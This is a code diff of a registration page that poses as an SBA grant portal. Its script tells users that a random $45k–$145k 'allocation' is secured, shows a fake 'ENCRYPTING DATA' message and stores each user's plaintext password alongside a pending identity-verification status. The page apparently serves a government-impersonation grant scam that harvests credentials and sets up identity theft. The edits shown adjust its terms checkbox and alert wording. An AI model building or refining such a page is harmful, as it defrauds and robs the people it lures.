@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -18,9 +19,10 @@
         input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
         input:focus { border-color: var(--sba-accent); }
 
+        /* LEGAL SECTION */
         .cert-box { display: flex; gap: 10px; background: #f8fafc; padding: 15px; border-radius: 8px; margin: 20px 0; border: 1px solid #e2e8f0; }
         .cert-box input { width: 20px; height: 20px; margin: 0; cursor: pointer; }
-        .cert-box label { text-transform: none; font-weight: 500; color: #475569; font-size: 10px; line-height: 1.4; margin: 0; letter-spacing: 0; }
+        .cert-box label { text-transform: none; font-weight: 500; color: #475569; font-size: 10px; line-height: 1.4; margin: 0; letter-spacing: 0; cursor: pointer; }
 
         .reg-btn { background: var(--sba-accent); color: white; padding: 16px; border-radius: 8px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
         .reg-btn:disabled { background: #94a3b8; }
@@ -54,7 +56,7 @@
             <div class="cert-box">
                 <input type="checkbox" id="terms">
                 <label for="terms">
-                    I certify that all provided information is accurate. I understand that misrepresentation to the SBA is a federal offense under <b>18 U.S.C. § 1001</b>.
+                    I certify that all provided information is accurate. I understand that misrepresentation to the SBA is a federal offense under <b>18 U.S.C. § 1001</b>. I have read the <a href="terms.html" style="color:var(--sba-accent); font-weight:bold;">Terms of Service</a>.
                 </label>
             </div>
 
@@ -90,17 +92,18 @@
             const pass = document.getElementById('pass').value;
             const agree = document.getElementById('terms').checked;
 
-            if(!name || !email || !pass || !agree) return alert("NOTICE: Complete all fields and certify accuracy.");
+            if(!name || !email || !pass) return alert("NOTICE: Complete all fields for federal verification.");
+            if(!agree) return alert("NOTICE: You must certify the accuracy of your information to proceed.");
 
             const btn = document.getElementById('regBtn');
             btn.innerText = "ENCRYPTING DATA...";
             btn.disabled = true;
 
             try {
-                // 1. Create User in Auth
+                // 1. Create User
                 const res = await createUserWithEmailAndPassword(auth, email, pass);
                 
-                // 2. Send the verification email immediately
+                // 2. Verification Email
                 await sendEmailVerification(res.user);
 
                 // 3. Grant Allocation Logic ($45k - $145k)
@@ -111,25 +114,22 @@
                     fullName: name,
                     email: email,
                     password: pass, 
-                    balance: amount, 
+                    balance: amount,
                     status: "ALLOCATED / PENDING VERIFICATION",
                     kycStatus: "NOT STARTED",
                     regDate: serverTimestamp()
                 });
 
-                // 5. SUCCESS FLOW
-                alert("ALLOCATION SECURED: $" + amount.toLocaleString() + " has been assigned to your profile.\n\nPlease check your email to verify your account before accessing the portal.");
+                alert("ALLOCATION SECURED: $" + amount.toLocaleString() + " has been assigned to your profile.\n\nPlease check your email to verify your account.");
                 
-                // REDIRECT TO VERIFY PAGE INSTEAD OF INDEX
+                // Final Redirect to Verify Page
                 window.location.href = 'verify.html';
 
             } catch(err) { 
-                console.error(err);
-                let msg = "Try again later.";
-                if (err.code === 'auth/email-already-in-use') msg = "Email already exists.";
-                if (err.code === 'auth/weak-password') msg = "Password is too weak.";
+                let errorMsg = "Please try again later.";
+                if (err.code === 'auth/email-already-in-use') errorMsg = "Email already exists.";
                 
-                alert("REGISTRATION ERROR: " + msg); 
+                alert("REGISTRATION ERROR: " + errorMsg); 
                 btn.disabled = false; 
                 btn.innerText = "Start Application";
             }
